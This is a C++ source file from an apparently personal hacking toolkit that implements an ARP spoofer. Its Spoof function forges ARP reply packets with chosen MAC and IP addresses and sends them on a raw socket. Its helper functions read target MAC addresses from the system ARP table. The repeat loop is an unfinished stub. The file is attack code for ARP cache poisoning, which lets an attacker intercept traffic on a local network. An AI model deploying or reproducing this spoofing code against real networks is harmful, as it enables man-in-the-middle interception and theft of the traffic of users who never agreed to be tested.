#include "ARPSpoofer.h"
#include "/home/tuomok/Projects/CHaks/CHaks/PacketCraft/src/include/PCInclude.h"

#include <iostream>
#include <cstring>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <arpa/inet.h> 
#include <sys/ioctl.h> 

ARPSpoof::ARPSpoofer::ARPSpoofer() :
    timeElapsed(0.0f)
{

}

ARPSpoof::ARPSpoofer::~ARPSpoofer()
{

}

int ARPSpoof::ARPSpoofer::Spoof(const int socketFd, const char* interfaceName, const char* srcMAC, const char* dstMAC, const char* srcIP, 
    const char* targetIP)
{
    PacketCraft::ARPPacket arpPacket;

    if(arpPacket.Create(srcMAC, dstMAC, srcIP, targetIP, ARPType::ARP_REPLY) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
        return APPLICATION_ERROR;
    }

    if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
        return APPLICATION_ERROR;
    }

    return NO_ERROR;
}

int ARPSpoof::ARPSpoofer::SpoofLoop(const int socketFd, const char* interfaceName, const char* srcMAC, const char* dstMAC, const char* srcIP, 
    const char* targetIP)
{
    while(true)
    {
        return NO_ERROR;
    }
}


// TODO: validate that the ip/mac address pair is actually in the ARP table. Currently the function succeeds even if the ip supplied is 
//       just a random address
int ARPSpoof::ARPSpoofer::GetARPTableAddr(const int socketFd, const char* interfaceName, const sockaddr_in& ipAddr, ether_addr& macAddr)
{
    arpreq arpEntry{};
    arpEntry.arp_pa.sa_family = AF_INET;
    memcpy(arpEntry.arp_pa.sa_data, ((sockaddr*)&ipAddr)->sa_data, sizeof(arpEntry.arp_pa.sa_data));
    arpEntry.arp_ha.sa_family = ARPHRD_ETHER;
    PacketCraft::CopyStr(arpEntry.arp_dev, sizeof(arpEntry.arp_dev), interfaceName);
    arpEntry.arp_flags = ATF_COM;   // TODO: is this needed? remove if not

    int res = ioctl(socketFd, SIOCGARP, &arpEntry);
    if(res < 0)
    {
        LOG_ERROR(APPLICATION_ERROR, "ioctl() error!");
        return APPLICATION_ERROR;
    }
    
    memcpy(macAddr.ether_addr_octet, arpEntry.arp_ha.sa_data, ETH_ALEN);
    return NO_ERROR;
}

int ARPSpoof::ARPSpoofer::GetARPTableAddr(const int socketFd, const char* interfaceName, const char* ipAddrStr, ether_addr& macAddr)
{
    sockaddr_in ipAddr{};
    if(inet_pton(AF_INET, ipAddrStr, &ipAddr.sin_addr) <= 0)
    {
        LOG_ERROR(APPLICATION_ERROR, "inet_pton() error!");
        return APPLICATION_ERROR;
    }

    return GetARPTableAddr(socketFd, interfaceName, ipAddr, macAddr);
}